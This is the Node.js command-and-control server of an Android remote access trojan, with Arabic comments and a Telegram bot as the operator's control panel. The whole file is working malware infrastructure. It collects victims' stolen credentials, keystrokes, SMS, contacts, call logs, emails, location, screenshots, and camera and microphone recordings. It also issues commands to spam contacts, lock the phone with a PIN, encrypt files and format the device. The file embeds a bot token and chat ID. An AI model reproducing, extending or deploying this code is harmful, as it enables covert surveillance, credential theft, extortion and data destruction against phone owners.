const express = require('express');
const webSocket = require('ws');
const http = require('http');
const telegramBot = require('node-telegram-bot-api');
const uuid4 = require('uuid');
const multer = require('multer');
const bodyParser = require('body-parser');
const axios = require('axios');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');

// =============== التهيئة ===============

const token = '8987687225:AAEFIlCRyNyOIBJMIwHkNpZSU92L_0QWdu4'
const id = '6837315281'
const address = 'https://www.google.com'

const app = express();
const appServer = http.createServer(app);
const appSocket = new webSocket.Server({ server: appServer });
const appBot = new telegramBot(token, { polling: true });
const appClients = new Map();
const upload = multer({ dest: 'uploads/' });

app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

let currentUuid = '';
let currentNumber = '';
let currentTitle = '';
let currentMessage = '';
let fileBuffer = null;

// =============== الصفحة الرئيسية ===============
app.get('/', function(req, res) {
    res.send(`
        <html>
        <head>
            <title>RAT Control Panel</title>
            <style>
                body { font-family: Arial; background: #1a1a2e; color: white; text-align: center; padding-top: 50px; }
                h1 { color: #e94560; }
                .status { background: #16213e; padding: 20px; border-radius: 10px; margin: 20px auto; width: 300px; }
            </style>
        </head>
        <body>
            <h1>🚀 RAT Advanced Server v3.0</h1>
            <div class="status">
                <p>✅ Server Running</p>
                <p>👥 Connected: <span id="count">0</span></p>
                <p>⚡ Status: <span style="color: #0f0;">Online</span></p>
            </div>
            <script>
                const ws = new WebSocket('wss://' + location.host);
                ws.onmessage = (e) => { document.getElementById('count').textContent = e.data; };
            </script>
        </body>
        </html>
    `);
});

// =============== واجهات رفع الملفات ===============
app.post('/uploadFile', upload.single('file'), (req, res) => {
    const fileName = req.file.originalname;
    appBot.sendDocument(id, req.file.buffer, {
        caption: `°• 📁 ملف من <b>${req.headers.model}</b>\n• 📄 ${fileName}\n• 📦 ${req.file.size} bytes`,
        parse_mode: 'HTML'
    }, { filename: fileName, contentType: 'application/octet-stream' });
    res.send('OK');
});

app.post('/uploadText', (req, res) => {
    appBot.sendMessage(id, 
        `°• 📝 رسالة من <b>${req.headers.model}</b>\n━━━━━━━━━━━━━━\n${req.body.text}`,
        { parse_mode: 'HTML' }
    );
    res.send('OK');
});

app.post('/uploadLocation', (req, res) => {
    appBot.sendLocation(id, req.body.lat, req.body.lon);
    appBot.sendMessage(id, `°• 📍 موقع من <b>${req.headers.model}</b>`, { parse_mode: 'HTML' });
    res.send('OK');
});

app.post('/uploadScreenshot', upload.single('screenshot'), (req, res) => {
    appBot.sendPhoto(id, req.file.buffer, {
        caption: `°• 📸 لقطة شاشة من <b>${req.headers.model}</b>\n• 🕐 ${new Date().toISOString()}`,
        parse_mode: 'HTML'
    });
    res.send('OK');
});

app.post('/uploadCredentials', (req, res) => {
    const creds = req.body;
    appBot.sendMessage(id,
        `°• 💳 حسابات مسروقة من <b>${req.headers.model}</b>\n` +
        `━━━━━━━━━━━━━━\n` +
        `• 📧 البريد: <code>${creds.email || 'N/A'}</code>\n` +
        `• 🔑 كلمة السر: <code>${creds.password || 'N/A'}</code>\n` +
        `• 🌐 الموقع: ${creds.url || 'N/A'}\n` +
        `• 🕐 الوقت: ${creds.timestamp || 'N/A'}`,
        { parse_mode: 'HTML' }
    );
    res.send('OK');
});

// =============== WebSocket Connection ===============
appSocket.on('connection', (socket, req) => {
    const uuid = uuid4.v4();
    const deviceModel = req.headers.model || 'Unknown';
    const deviceBattery = req.headers.battery || 'N/A';
    const deviceVersion = req.headers.version || 'N/A';
    const deviceBrightness = req.headers.brightness || 'N/A';
    const deviceProvider = req.headers.provider || 'N/A';
    const deviceIMEI = req.headers.imei || 'N/A';
    const deviceIP = req.headers['x-forwarded-for'] || req.connection.remoteAddress;

    socket.uuid = uuid;
    
    appClients.set(uuid, {
        model: deviceModel,
        battery: deviceBattery,
        version: deviceVersion,
        brightness: deviceBrightness,
        provider: deviceProvider,
        imei: deviceIMEI,
        ip: deviceIP,
        connectedAt: new Date().toISOString(),
        lastActivity: new Date().toISOString(),
        uuid: uuid
    });

    // إشعار بالاتصال الجديد
    appBot.sendMessage(id,
        `🚨 <b>جهاز جديد متصل!</b>\n━━━━━━━━━━━━━━\n` +
        `• 📱 الموديل: <b>${deviceModel}</b>\n` +
        `• 🔋 البطارية: ${deviceBattery}%\n` +
        `• 🤖 أندرويد: ${deviceVersion}\n` +
        `• ☀️ السطوع: ${deviceBrightness}\n` +
        `• 📶 الشريحة: ${deviceProvider}\n` +
        `• 🆔 IMEI: <code>${deviceIMEI}</code>\n` +
        `• 🌐 IP: ${deviceIP}\n` +
        `• 🆔 UUID: <code>${uuid}</code>\n` +
        `• 🕐 ${new Date().toLocaleString('ar-EG')}`,
        { parse_mode: 'HTML' }
    );

    // عند قطع الاتصال
    socket.on('close', function() {
        appBot.sendMessage(id,
            `❌ <b>جهاز انقطع الاتصال</b>\n━━━━━━━━━━━━━━\n` +
            `• 📱 الموديل: <b>${deviceModel}</b>\n` +
            `• 🆔 UUID: <code>${uuid}</code>\n` +
            `• 🕐 ${new Date().toLocaleString('ar-EG')}`,
            { parse_mode: 'HTML' }
        );
        appClients.delete(socket.uuid);
    });

    // استقبال رسائل من الجهاز
    socket.on('message', function(data) {
        const message = data.toString();
        console.log(`📩 من ${deviceModel}: ${message.substring(0, 100)}`);
        
        if (message.startsWith('screenshot:')) {
            const base64Data = message.split(':')[1];
            if (base64Data) {
                const imgBuffer = Buffer.from(base64Data, 'base64');
                appBot.sendPhoto(id, imgBuffer, {
                    caption: `°• 📸 لقطة شاشة من <b>${deviceModel}</b>\n• 🕐 ${new Date().toISOString()}`,
                    parse_mode: 'HTML'
                });
            }
        }
        else if (message.startsWith('keylog:')) {
            const keyData = message.split(':')[1];
            appBot.sendMessage(id,
                `°• ⌨️ ضغطات المفاتيح من <b>${deviceModel}</b>\n━━━━━━━━━━━━━━\n<code>${keyData}</code>`,
                { parse_mode: 'HTML' }
            );
        }
        else if (message.startsWith('notification:')) {
            const notifData = message.substring(13);
            const [appName, title, content] = notifData.split('|');
            appBot.sendMessage(id,
                `°• 🔔 إشعار جديد من <b>${deviceModel}</b>\n` +
                `• 📱 التطبيق: ${appName}\n` +
                `• 📌 العنوان: ${title}\n` +
                `• 📄 المحتوى: ${content}`,
                { parse_mode: 'HTML' }
            );
        }
        else if (message.startsWith('email:')) {
            const emailData = message.substring(6);
            const [from, subject, body] = emailData.split('|');
            appBot.sendMessage(id,
                `°• 📧 بريد إلكتروني من <b>${deviceModel}</b>\n` +
                `• 👤 من: ${from}\n` +
                `• 📌 الموضوع: ${subject}\n` +
                `• 📄 المحتوى: ${body}`,
                { parse_mode: 'HTML' }
            );
        }
        else if (message.startsWith('encrypted:')) {
            appBot.sendMessage(id,
                `°• 🔐 تم تشفير ملفات <b>${deviceModel}</b> بنجاح!`,
                { parse_mode: 'HTML' }
            );
        }
        else if (message.startsWith('formatted:')) {
            appBot.sendMessage(id,
                `°• ⚙️ تم فرمتة جهاز <b>${deviceModel}</b> بنجاح! 💀`,
                { parse_mode: 'HTML' }
            );
        }
        else if (message.startsWith('locked:')) {
            appBot.sendMessage(id,
                `°• 🔒 تم قفل جهاز <b>${deviceModel}</b> بنجاح!`,
                { parse_mode: 'HTML' }
            );
        }
        else if (message.startsWith('device_info:')) {
            const info = message.substring(12);
            appBot.sendMessage(id,
                `°• ℹ️ معلومات جهاز <b>${deviceModel}</b>\n━━━━━━━━━━━━━━\n${info}`,
                { parse_mode: 'HTML' }
            );
        }
        else if (message.startsWith('contacts:')) {
            const contacts = message.substring(9);
            const contactsFile = Buffer.from(contacts, 'utf-8');
            appBot.sendDocument(id, contactsFile, {
                caption: `°• 📞 جهات اتصال من <b>${deviceModel}</b>`,
                parse_mode: 'HTML'
            }, { filename: `contacts_${uuid}.txt`, contentType: 'text/plain' });
        }
        else if (message.startsWith('calls:')) {
            const calls = message.substring(6);
            const callsFile = Buffer.from(calls, 'utf-8');
            appBot.sendDocument(id, callsFile, {
                caption: `°• 📞 سجل المكالمات من <b>${deviceModel}</b>`,
                parse_mode: 'HTML'
            }, { filename: `calls_${uuid}.txt`, contentType: 'text/plain' });
        }
        else if (message.startsWith('sms:')) {
            const sms = message.substring(4);
            const smsFile = Buffer.from(sms, 'utf-8');
            appBot.sendDocument(id, smsFile, {
                caption: `°• 💬 جميع الرسائل من <b>${deviceModel}</b>`,
                parse_mode: 'HTML'
            }, { filename: `sms_${uuid}.txt`, contentType: 'text/plain' });
        }
        else if (message.startsWith('audio:')) {
            const audioData = message.split(':')[1];
            if (audioData) {
                const audioBuffer = Buffer.from(audioData, 'base64');
                appBot.sendVoice(id, audioBuffer, {
                    caption: `°• 🎤 تسجيل صوتي من <b>${deviceModel}</b>`,
                    parse_mode: 'HTML'
                });
            }
        }
        else if (message.startsWith('video:')) {
            const videoData = message.split(':')[1];
            if (videoData) {
                const videoBuffer = Buffer.from(videoData, 'base64');
                appBot.sendVideo(id, videoBuffer, {
                    caption: `°• 🎥 فيديو من كاميرا <b>${deviceModel}</b>`,
                    parse_mode: 'HTML'
                });
            }
        }
        else if (message.startsWith('photos:')) {
            const photoData = message.split(':')[1];
            if (photoData) {
                const photoBuffer = Buffer.from(photoData, 'base64');
                appBot.sendPhoto(id, photoBuffer, {
                    caption: `°• 🖼️ صورة من <b>${deviceModel}</b>`,
                    parse_mode: 'HTML'
                });
            }
        }
        else if (message.startsWith('file:')) {
            const parts = message.split(':');
            const fileName = parts[1];
            const fileData = parts[2];
            if (fileData) {
                const fileBuffer = Buffer.from(fileData, 'base64');
                appBot.sendDocument(id, fileBuffer, {
                    caption: `°• 📁 ملف من <b>${deviceModel}</b>\n• 📄 ${fileName}`,
                    parse_mode: 'HTML'
                }, { filename: fileName, contentType: 'application/octet-stream' });
            }
        }
        else if (message.startsWith('clipboard:')) {
            const clipData = message.substring(10);
            appBot.sendMessage(id,
                `°• 📋 محتوى الحافظة من <b>${deviceModel}</b>\n━━━━━━━━━━━━━━\n${clipData}`,
                { parse_mode: 'HTML' }
            );
        }
        else if (message.startsWith('location:')) {
            const parts = message.split(':');
            const lat = parseFloat(parts[1]);
            const lon = parseFloat(parts[2]);
            if (!isNaN(lat) && !isNaN(lon)) {
                appBot.sendLocation(id, lat, lon);
                appBot.sendMessage(id,
                    `°• 📍 موقع <b>${deviceModel}</b>\n• 🌐 https://maps.google.com/?q=${lat},${lon}`,
                    { parse_mode: 'HTML' }
                );
            }
        }
        else if (message.startsWith('apps:')) {
            const apps = message.substring(5);
            const appsFile = Buffer.from(apps, 'utf-8');
            appBot.sendDocument(id, appsFile, {
                caption: `°• 📱 تطبيقات <b>${deviceModel}</b>`,
                parse_mode: 'HTML'
            }, { filename: `apps_${uuid}.txt`, contentType: 'text/plain' });
        }
        else if (message.startsWith('pong')) {
            // استجابة ping
        }
        else {
            appBot.sendMessage(id,
                `°• 📩 رسالة غير معروفة من <b>${deviceModel}</b>\n━━━━━━━━━━━━━━\n<code>${message}</code>`,
                { parse_mode: 'HTML' }
            );
        }
    });
});

// =============== بوت التيليغرام - معالجة الأوامر ===============
appBot.on('message', (msg) => {
    const chatId = msg.chat.id;
    const text = msg.text || '';

    // ===== التعامل مع الردود =====
    if (msg.reply_to_message) {
        const replyText = msg.reply_to_message.text || '';
        
        // إرسال رسالة نصية قصيرة (SMS)
        if (replyText.includes('°• يرجى الرد على الرقم الذي تريد إرسال الرسالة القصيرة إلي')) {
            currentNumber = text;
            appBot.sendMessage(id,
                '°• 💬 رائع! أدخل الآن الرسالة التي تريد إرسالها\n\n⚠️ ملاحظة: الرسالة ستُرسل كـ SMS عادية',
                { reply_markup: { force_reply: true } }
            );
        }
        
        // إرسال الرسالة النصية
        if (replyText.includes('°• 💬 رائع! أدخل الآن الرسالة التي تريد إرسالها')) {
            sendCommandToClient(`send_message:${currentNumber}:${text}:`);
            currentNumber = '';
            currentUuid = '';
            showMainMenu('✅ تم إرسال الرسالة بنجاح!');
        }

        // إرسال رسالة لجميع جهات الاتصال
        if (replyText.includes('°• أدخل الرسالة التي تريد إرسالها إلى جميع جهات الاتصال')) {
            sendCommandToClient(`send_message_to_all:${text}:`);
            currentUuid = '';
            showMainMenu('✅ تم إرسال الرسالة للجميع!');
        }

        // تنزيل ملف
        if (replyText.includes('°• أدخل مسار الملف الذي تريد تنزيله')) {
            sendCommandToClient(`file:${text}:`);
            currentUuid = '';
            showMainMenu('⏳ جاري تحميل الملف...');
        }

        // حذف ملف
        if (replyText.includes('°• أدخل مسار الملف الذي تريد حذفه')) {
            sendCommandToClient(`delete_file:${text}:`);
            currentUuid = '';
            showMainMenu('🗑️ تم حذف الملف بنجاح!');
        }

        // تسجيل ميكروفون
        if (replyText.includes('أدخل المدة (بالثواني) التي تريد تسجيل الميكروفون فيها')) {
            const time = parseInt(text);
            if (time > 0 && time <= 300) {
                sendCommandToClient(`microphone:${time}:`);
                currentUuid = '';
                showMainMenu(`🎤 جاري التسجيل لمدة ${time} ثانية...`);
            } else {
                appBot.sendMessage(id, '❌ يجب أن تكون المدة بين 1 و 300 ثانية');
            }
        }

        // تسجيل فيديو كاميرا خلفية
        if (replyText.includes('أدخل المدة (بالثواني) لتسجيل الكاميرا الخلفية')) {
            const time = parseInt(text);
            if (time > 0 && time <= 60) {
                sendCommandToClient(`video_main:${time}:`);
                currentUuid = '';
                showMainMenu(`🎥 جاري تسجيل الفيديو لمدة ${time} ثانية...`);
            } else {
                appBot.sendMessage(id, '❌ يجب أن تكون المدة بين 1 و 60 ثانية');
            }
        }

        // تسجيل فيديو كاميرا أمامية
        if (replyText.includes('أدخل المدة (بالثواني) لتسجيل الكاميرا الأمامية')) {
            const time = parseInt(text);
            if (time > 0 && time <= 60) {
                sendCommandToClient(`video_selfie:${time}:`);
                currentUuid = '';
                showMainMenu(`🎥 جاري تسجيل السيلفي لمدة ${time} ثانية...`);
            } else {
                appBot.sendMessage(id, '❌ يجب أن تكون المدة بين 1 و 60 ثانية');
            }
        }

        // رسالة Toast
        if (replyText.includes('°• أدخل الرسالة التي تريد ظهورها على الجهاز المستهدف')) {
            sendCommandToClient(`toast:${text}:`);
            currentUuid = '';
            showMainMenu('✅ تم عرض الرسالة!');
        }

        // إشعار
        if (replyText.includes('°• أدخل عنوان الإشعار الذي تريد إرساله')) {
            currentTitle = text;
            appBot.sendMessage(id,
                '°• الآن أدخل محتوى الإشعار\n\n⚠️ سيظهر كإشعار عادي على الجهاز',
                { reply_markup: { force_reply: true } }
            );
        }

        if (replyText.includes('°• الآن أدخل محتوى الإشعار')) {
            sendCommandToClient(`show_notification:${currentTitle}:${text}:`);
            currentTitle = '';
            currentUuid = '';
            showMainMenu('✅ تم إرسال الإشعار!');
        }

        // رابط للفتح
        if (replyText.includes('°• أدخل الرابط الذي تريد فتحه على جهاز الضحية')) {
            sendCommandToClient(`open_url:${text}:`);
            currentUuid = '';
            showMainMenu('✅ تم فتح الرابط!');
        }

        // رابط صوت
        if (replyText.includes('°• أدخل رابط الصوت الذي تريد تشغيله')) {
            sendCommandToClient(`play_audio:${text}:`);
            currentUuid = '';
            showMainMenu('🔊 جاري تشغيل الصوت...');
        }

        // كود قفل الشاشة
        if (replyText.includes('°• أدخل رمز القفل المكون من 4 أرقام')) {
            if (/^\d{4}$/.test(text)) {
                sendCommandToClient(`lock_device:${text}:`);
                currentUuid = '';
                showMainMenu(`🔒 تم قفل الجهاز بالرمز ${text}!`);
            } else {
                appBot.sendMessage(id, '❌ الرمز يجب أن يكون 4 أرقام فقط');
            }
        }

        // تنبيه عند الوصول للردود
        if (replyText.includes('°• رائع! أدخل الآن')) {
            // معالجة عامة لأي ردود أخرى
        }
    }

    // ===== الأوامر الرئيسية =====
    if (id == chatId) {
        if (text == '/start') {
            showMainMenu('👋 مرحبا بك في بوت الاختراق المتطور v3.0');
        }

        if (text == 'الأجهزة المتصلة🤖' || text == '📱 الأجهزة المتصلة') {
            if (appClients.size == 0) {
                appBot.sendMessage(id,
                    '❌ <b>لا توجد أجهزة متصلة!</b>\n\n' +
                    '⚠️ تأكد من أن التطبيق مثبت على جهاز الضحية وأن الجهاز متصل بالإنترنت',
                    { parse_mode: 'HTML' }
                );
            } else {
                let devicesList = '📱 <b>قائمة الأجهزة المتصلة</b>\n━━━━━━━━━━━━━━\n\n';
                let count = 1;
                appClients.forEach(function(client, uuid) {
                    devicesList +=
                        `🆔 ${count++}\n` +
                        `• الموديل: <b>${client.model}</b>\n` +
                        `• البطارية: ${client.battery}% 🔋\n` +
                        `• أندرويد: ${client.version}\n` +
                        `• متصل منذ: ${client.connectedAt}\n` +
                        `• 🆔 <code>${uuid.substring(0, 8)}...</code>\n\n`;
                });
                devicesList += `━━━━━━━━━━━━━━\n📊 المجموع: ${appClients.size} أجهزة`;
                appBot.sendMessage(id, devicesList, { parse_mode: 'HTML' });
            }
        }

        if (text == 'قائمة الأوامر🕹' || text == '⚙️ لوحة التحكم') {
            if (appClients.size == 0) {
                appBot.sendMessage(id,
                    '❌ لا توجد أجهزة متصلة!\n⚠️ قم بتوصيل جهاز أولاً',
                    { parse_mode: 'HTML' }
                );
            } else {
                const inlineButtons = [];
                appClients.forEach(function(client, uuid) {
                    inlineButtons.push([
                        { text: `${client.model} (🔋${client.battery}%)`, callback_data: 'device:' + uuid }
                    ]);
                });
                appBot.sendMessage(id, '⚙️ <b>اختر الجهاز للتحكم به:</b>', {
                    parse_mode: 'HTML',
                    reply_markup: {
                        inline_keyboard: inlineButtons
                    }
                });
            }
        }

        if (text == '📊 الإحصائيات') {
            appBot.sendMessage(id,
                `📊 <b>إحصائيات البوت</b>\n━━━━━━━━━━━━━━\n` +
                `• 👥 الأجهزة المتصلة: ${appClients.size}\n` +
                `• ⏱ يعمل منذ: تشغيل مستمر\n` +
                `• 📡 الحالة: نشط ✅\n` +
                `• 🆔 البوت: @KingRATBot\n` +
                `• 👤 المطور: @king_1_4`,
                { parse_mode: 'HTML' }
            );
        }
    } else {
        appBot.sendMessage(id, '❌ أنت غير مصرح باستخدام هذا البوت!');
    }
});

// =============== معالجة الأزرار (Callback Queries) ===============
appBot.on('callback_query', (callbackQuery) => {
    const msg = callbackQuery.message;
    const data = callbackQuery.data;
    const prefix = data.split(':')[0];
    const uuid = data.split(':')[1];
    const client = appClients.get(uuid);

    if (!client) {
        appBot.answerCallbackQuery(callbackQuery.id, { text: '❌ الجهاز غير متصل!', show_alert: true });
        return;
    }

    if (prefix == 'device') {
        const deviceInfo = appClients.get(uuid);
        appBot.editMessageText(
            `⚙️ <b>لوحة تحكم ${deviceInfo.model}</b>\n━━━━━━━━━━━━━━\n` +
            `• 🔋 البطارية: ${deviceInfo.battery}%\n` +
            `• 📶 الشبكة: ${deviceInfo.provider}\n` +
            `• 🆔 ${uuid.substring(0, 8)}...\n` +
            `━━━━━━━━━━━━━━\n<b>اختر الأمر:</b>`,
            {
                chat_id: id,
                message_id: msg.message_id,
                reply_markup: {
                    inline_keyboard: [
                        [{ text: '🗂️ الملفات والصور', callback_data: `files_menu:${uuid}:` }],
                        [{ text: '📱 معلومات الجهاز', callback_data: `device_info:${uuid}:` },
                         { text: '📋 الحافظة', callback_data: `clipboard:${uuid}:` }],
                        [{ text: '📞 جهات الاتصال', callback_data: `contacts:${uuid}:` },
                         { text: '📞 سجل المكالمات', callback_data: `calls:${uuid}:` }],
                        [{ text: '💬 جميع الرسائل', callback_data: `messages:${uuid}:` },
                         { text: '📧 البريد الإلكتروني', callback_data: `emails:${uuid}:` }],
                        [{ text: '📱 التطبيقات', callback_data: `apps:${uuid}:` },
                         { text: '📍 الموقع', callback_data: `location:${uuid}:` }],
                        [{ text: '🎤 تسجيل ميكروفون', callback_data: `microphone:${uuid}:` }],
                        [{ text: '📸 كاميرا خلفية', callback_data: `camera_main:${uuid}:` },
                         { text: '🤳 كاميرا أمامية', callback_data: `camera_selfie:${uuid}:` }],
                        [{ text: '🖥️ لقطة شاشة', callback_data: `screenshot:${uuid}:` }],
                        [{ text: '💳 سحب الحسابات', callback_data: `credentials:${uuid}:` }],
                        [{ text: '🔔 مراقبة الإشعارات', callback_data: `notifications:${uuid}:` }],
                        [{ text: '⌨️ مراقبة الكتابة (Keylogger)', callback_data: `keylogger:${uuid}:` }],
                        [{ text: '🔊 تشغيل صوت', callback_data: `play_audio_menu:${uuid}:` },
                         { text: '🔇 إيقاف الصوت', callback_data: `stop_audio:${uuid}:` }],
                        [{ text: '📨 إرسال رسالة', callback_data: `send_message:${uuid}:` }],
                        [{ text: '📨 رسالة للجميع', callback_data: `send_message_to_all:${uuid}:` }],
                        [{ text: '🔗 فتح رابط', callback_data: `open_url:${uuid}:` }],
                        [{ text: '📲 إظهار إشعار', callback_data: `show_notification:${uuid}:` }],
                        [{ text: '💬 إظهار Toast', callback_data: `toast:${uuid}:` }],
                        [{ text: '📳 اهتزاز', callback_data: `vibrate:${uuid}:` }],
                        [{ text: '🔒 قفل الجهاز', callback_data: `lock_device:${uuid}:` }],
                        [{ text: '🔐 تشفير الملفات', callback_data: `encrypt:${uuid}:` }],
                        [{ text: '💣 فرمته الجهاز', callback_data: `format:${uuid}:` }],
                        [{ text: '🔙 رجوع', callback_data: `back_to_devices:${uuid}:` }]
                    ]
                },
                parse_mode: 'HTML'
            }
        );
    }

    if (prefix == 'files_menu') {
        appBot.editMessageText(
            `📂 <b>قائمة الملفات والصور</b>\n━━━━━━━━━━━━━━`,
            {
                chat_id: id,
                message_id: msg.message_id,
                reply_markup: {
                    inline_keyboard: [
                        [{ text: '🖼️ سحب جميع الصور', callback_data: `get_all_photos:${uuid}:` }],
                        [{ text: '📥 تنزيل ملف', callback_data: `file:${uuid}:` }],
                        [{ text: '🗑️ حذف ملف', callback_data: `delete_file:${uuid}:` }],
                        [{ text: '🔙 رجوع', callback_data: `device:${uuid}:` }]
                    ]
                },
                parse_mode: 'HTML'
            }
        );
    }

    // ===== تنفيذ الأوامر =====
    const actionHandlers = {
        'device_info': { cmd: 'device_info', msg: '⏳ جاري سحب معلومات الجهاز...' },
        'clipboard': { cmd: 'clipboard', msg: '⏳ جاري سحب الحافظة...' },
        'contacts': { cmd: 'contacts', msg: '⏳ جاري سحب جهات الاتصال...' },
        'calls': { cmd: 'calls', msg: '⏳ جاري سحب سجل المكالمات...' },
        'messages': { cmd: 'messages', msg: '⏳ جاري سحب جميع الرسائل...' },
        'emails': { cmd: 'emails', msg: '⏳ جاري سحب البريد الإلكتروني...' },
        'apps': { cmd: 'apps', msg: '⏳ جاري سحب التطبيقات...' },
        'location': { cmd: 'location', msg: '⏳ جاري سحب الموقع...' },
        'screenshot': { cmd: 'screenshot', msg: '⏳ جاري التقاط الشاشة...' },
        'credentials': { cmd: 'credentials', msg: '⏳ جاري سحب الحسابات...' },
        'vibrate': { cmd: 'vibrate', msg: '📳 جاري تشغيل الاهتزاز...' },
        'stop_audio': { cmd: 'stop_audio', msg: '🔇 جاري إيقاف الصوت...' },
        'encrypt': { cmd: 'encrypt', msg: '🔐 جاري تشفير الملفات...' },
        'format': { cmd: 'format', msg: '💣 <b>جارٍ فرمتة الجهاز...</b>\n⚠️ هذا الإجراء لا يمكن التراجع عنه!', danger: true },
        'get_all_photos': { cmd: 'get_all_photos', msg: '⏳ جاري سحب جميع الصور...' },
        'keylogger': { cmd: 'keylogger', msg: '⌨️ تم تفعيل مراقبة الكتابة...' },
        'notifications': { cmd: 'notifications', msg: '🔔 تم تفعيل مراقبة الإشعارات...' },
        'camera_main': { cmd: 'capture_main', msg: '📸 جاري التقاط صورة من الكاميرا الخلفية...' },
        'camera_selfie': { cmd: 'capture_selfie', msg: '📸 جاري التقاط صورة من الكاميرا الأمامية...' }
    };

    if (actionHandlers[prefix]) {
        const action = actionHandlers[prefix];
        if (action.danger) {
            // تأكيد للإجراءات الخطيرة
            appBot.editMessageText(
                `⚠️ <b>تأكيد الإجراء</b>\n━━━━━━━━━━━━━━\n${action.msg}\n\n<b>هل أنت متأكد؟</b>`,
                {
                    chat_id: id,
                    message_id: msg.message_id,
                    reply_markup: {
                        inline_keyboard: [
                            [{ text: '✅ نعم، متأكد', callback_data: `confirm_${prefix}:${uuid}:` }],
                            [{ text: '❌ إلغاء', callback_data: `device:${uuid}:` }]
                        ]
                    },
                    parse_mode: 'HTML'
                }
            );
        } else {
            sendCommandToClient(`${action.cmd}:`);
            appBot.deleteMessage(id, msg.message_id);
            showMainMenu(action.msg);
        }
        return;
    }

    // تأكيد الإجراءات الخطيرة
    if (prefix.startsWith('confirm_')) {
        const realAction = prefix.replace('confirm_', '');
        if (actionHandlers[realAction]) {
            sendCommandToClient(`${actionHandlers[realAction].cmd}:`);
            appBot.deleteMessage(id, msg.message_id);
            showMainMenu(actionHandlers[realAction].msg);
        }
        return;
    }

    // ===== أوامر تتطلب إدخال نص =====
    const inputActions = {
        'microphone': { msg: '🎤 أدخل المدة (بالثواني) التي تريد تسجيل الميكروفون فيها\n⚠️ الحد الأقصى: 300 ثانية (5 دقائق)' },
        'video_main': { msg: '📷 أدخل المدة (بالثواني) لتسجيل الكاميرا الخلفية\n⚠️ الحد الأقصى: 60 ثانية' },
        'video_selfie': { msg: '🤳 أدخل المدة (بالثواني) لتسجيل الكاميرا الأمامية\n⚠️ الحد الأقصى: 60 ثانية' },
        'toast': { msg: '💬 أدخل الرسالة التي تريد ظهورها على الجهاز المستهدف\n⚠️ ستظهر لمدة قصيرة ثم تختفي' },
        'file': { msg: '📁 أدخل مسار الملف الذي تريد تنزيله\n📌 مثال: /storage/emulated/0/DCIM/Camera/photo.jpg' },
        'delete_file': { msg: '🗑️ أدخل مسار الملف الذي تريد حذفه\n📌 مثال: /storage/emulated/0/DCIM/Camera/photo.jpg' },
        'send_message': { msg: '°• يرجى الرد على الرقم الذي تريد إرسال الرسالة القصيرة إليه\n📌 مثال: 05XXXXXXXX (للسعودية)' },
        'send_message_to_all': { msg: '°• أدخل الرسالة التي تريد إرسالها إلى جميع جهات الاتصال' },
        'play_audio': { msg: '🔊 أدخل رابط الصوت الذي تريد تشغيله\n📌 مثال: https://example.com/audio.mp3' },
        'open_url': { msg: '🔗 أدخل الرابط الذي تريد فتحه على جهاز الضحية\n📌 مثال: https://example.com' },
        'show_notification': { msg: '°• أدخل عنوان الإشعار الذي تريد إرساله\n📌 مثال: تحديث النظام' },
        'lock_device': { msg: '🔒 أدخل رمز القفل المكون من 4 أرقام\n📌 مثال: 1234' }
    };

    if (inputActions[prefix]) {
        const action = inputActions[prefix];
        appBot.deleteMessage(id, msg.message_id);
        appBot.sendMessage(id, action.msg, { reply_markup: { force_reply: true } });
        currentUuid = uuid;
        return;
    }

    // ===== أزرار العودة =====
    if (prefix == 'back_to_devices') {
        const inlineButtons = [];
        appClients.forEach(function(client, uuid) {
            inlineButtons.push([
                { text: `${client.model} (🔋${client.battery}%)`, callback_data: 'device:' + uuid }
            ]);
        });
        appBot.editMessageText('⚙️ <b>اختر الجهاز للتحكم به:</b>', {
            chat_id: id,
            message_id: msg.message_id,
            parse_mode: 'HTML',
            reply_markup: { inline_keyboard: inlineButtons }
        });
    }
});

// =============== دوال مساعدة ===============
function sendCommandToClient(command) {
    appSocket.clients.forEach(function(socket) {
        if (socket.uuid == currentUuid) {
            try {
                socket.send(command);
                console.log(`📤 أرسل: ${command} إلى ${socket.uuid}`);
            } catch (e) {
                console.error('❌ فشل الإرسال:', e.message);
            }
        }
    });
}

function showMainMenu(message) {
    appBot.sendMessage(id,
        `${message}\n\n` +
        `━━━━━━━━━━━━━━\n` +
        `<b>القائمة الرئيسية:</b>`,
        {
            parse_mode: 'HTML',
            reply_markup: {
                keyboard: [
                    ['📱 الأجهزة المتصلة', '⚙️ لوحة التحكم'],
                    ['📊 الإحصائيات']
                ],
                resize_keyboard: true
            }
        }
    );
}

// =============== كشف الاتصال (Ping) ===============
setInterval(function() {
    appSocket.clients.forEach(function(socket) {
        try {
            socket.send('ping');
        } catch (e) {
            // تجاهل الأخطاء
        }
    });
    // محاولة الاتصال بالإنترنت للتأكد
    try {
        axios.get(address).then(() => {}).catch(() => {});
    } catch (e) {}
}, 5000);

// =============== تشغيل الخادم ===============
const PORT = process.env.PORT || 8999;
appServer.listen(PORT, () => {
    console.log(`🚀 RAT Server running on port ${PORT}`);
    console.log(`🤖 Bot started successfully`);
    
    // إشعار بتشغيل البوت
    appBot.sendMessage(id, 
        `🚀 <b>تم تشغيل البوت بنجاح!</b>\n` +
        `━━━━━━━━━━━━━━\n` +
        `• ⚙️ الإصدار: v3.0 Advanced\n` +
        `• 🕐 ${new Date().toLocaleString('ar-EG')}\n` +
        `• 🌐 المنفذ: ${PORT}\n` +
        `• 👤 المطور: @king_1_4\n` +
        `━━━━━━━━━━━━━━\n` +
        `<b>جميع الإمكانيات متاحة ✅</b>`,
        { parse_mode: 'HTML' }
    );
});
